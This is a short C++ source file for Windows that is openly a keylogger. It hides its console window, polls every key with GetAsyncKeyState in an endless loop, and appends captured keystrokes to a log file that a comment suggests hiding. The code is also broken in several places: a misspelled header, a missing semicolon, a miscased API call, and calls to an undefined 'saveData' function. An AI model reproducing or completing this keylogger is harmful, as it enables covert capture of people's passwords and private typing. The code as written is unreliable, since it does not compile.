#include <iostrean>
#include <fstream>
#include <windows.h
#include <bits/stdc++.h>

// path to log file
// TODO make this hidden?
#define LOG_FILE "collected.txt"

// save the data to the log file
void collectData(std::string data)
{
    std::fstream logFile;

    // open the file
    // std::ios::app makes new daata append instead of overwriting
    logFile.open(LOG_FILE, std::ios::app)

        // write the data
        logFile << data;

    // end fiel stream
    logFile.close();
}

// conversions for special keys (space, enter, tab etc)
std::string translateKey(int key) {
    std::string result; 

    switch (key)
    {
    case VK_SPACE:
        result = " ";
        break;
    case VK_RETURN:
        result = "\n";
        break;
    case VK_BACK:
        result = "\b";
        break;
    case VK_CAPITAL:
        result = "[CAPSL]";
        break;
    case VK_SHIFT:
        result = "[SHIFT]";
        break;
    case VK_TAB:
        result = "[TAB]";
        break;
    case VK_CONTROL:
        result = "[CTRL]";
        break;
    case VK_MENU:
        result = "[ALT]";
        break;
    default:
        break;
    }

    return result;
}

int main(){

    int specialKeyArray[] =  {VK_SPACE, VK_RETURN, VK_BACK, VK_CAPITAL, VK_SHIFT, VK_TAB, VK_CONTROL, VK_MENU};
    std::string specialKeyChar;
    bool isSpecialKey; 

    // Hide terminal window
    HWND window = getConsoleWindow();
    ShowWindow(window, SW_HIDE);

    // loop for program's duration
    while(true){
        // iterate through each key
        for(int key = 8; key <=190; key++){
            //check for key press
            if(GetAsyncKeyState(key) == -32767){
                // key is being pressed 
                // is key special key
                isSpecialKey = std::find(std::begin(specialKeyArray), std::end(specialKeyArray), key) != std::end(specialKeyArray);
                
                if(isSpecialKey){
                // translate special key to string
                specialKeyChar = translateKey(key);
                // save this data
                saveData(specialKeyChar);
                } else {
                    // regular key
                    saveData(key);
                }
            }
        } 
    }
}